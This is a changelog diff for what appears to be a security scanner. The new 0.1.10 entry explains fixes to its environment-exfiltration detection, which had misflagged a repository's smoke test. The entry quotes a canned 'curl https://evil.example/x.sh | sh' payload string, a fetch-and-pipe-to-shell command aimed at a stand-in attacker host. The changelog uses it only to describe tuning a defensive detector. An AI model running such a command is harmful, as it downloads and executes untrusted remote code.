@@ -1,5 +1,14 @@
 # Changelog
 
+## 0.1.10 (2026-10-22)
+
+P-091 acceptance follow-on, found the same day by running the v0.1.9 acceptance against a fresh shallow clone of CloudCorpRecords/xod (2 new tests in test/v019.test.ts, 235 total). v0.1.9 closed the distilled cd1 fixture, but the real tests/smoke/run_cli_test.py in xod still carried one ENV-EXFIL finding and the repo still verdicted COMPROMISED-PATTERN, through two residual shapes of the same problem:
+
+- The inherited env dict reached the subprocess through a wrapper parameter fallback (env=env or ENV, where ENV is the {**os.environ, ...} dict and env is the wrapper's parameter), so the assignment was not recognized as passed as a subprocess environment and its bulk atom kept impure weight. A variable now counts as passed as the environment when its name appears in the env= or env: value region, including inside a fallback expression.
+- The only remote URL in the file sits inside a stand-in server card (a canned "curl https://evil.example/x.sh | sh" payload string the test feeds to its own fake server), and destination collection read raw text, so that data string counted as a non-loopback destination in the flow. Destinations are now collected from the URL view (the P-064 view): URLs inside data literals are not destinations, while URLs handed to network calls still count in full.
+
+With both, xod verdicts REVIEW with zero ENV-EXFIL findings. Controls hold: the same inheritance shapes with a real remote send destination still fire ENV-EXFIL, and the A1 fixture stays COMPROMISED-PATTERN.
+
 ## 0.1.9 (2026-10-22)
 
 Overnight flywheel fixes (validation/problems.md P-069, P-071, P-072, P-091), hunted by the chaos and cross-dogfood swarms against the published 0.1.7 and re-verified on the published 0.1.8 before fixing (19 new tests in test/v019.test.ts, 233 total; three pre-existing tests that pinned the old discovery depth bound moved with the bound).
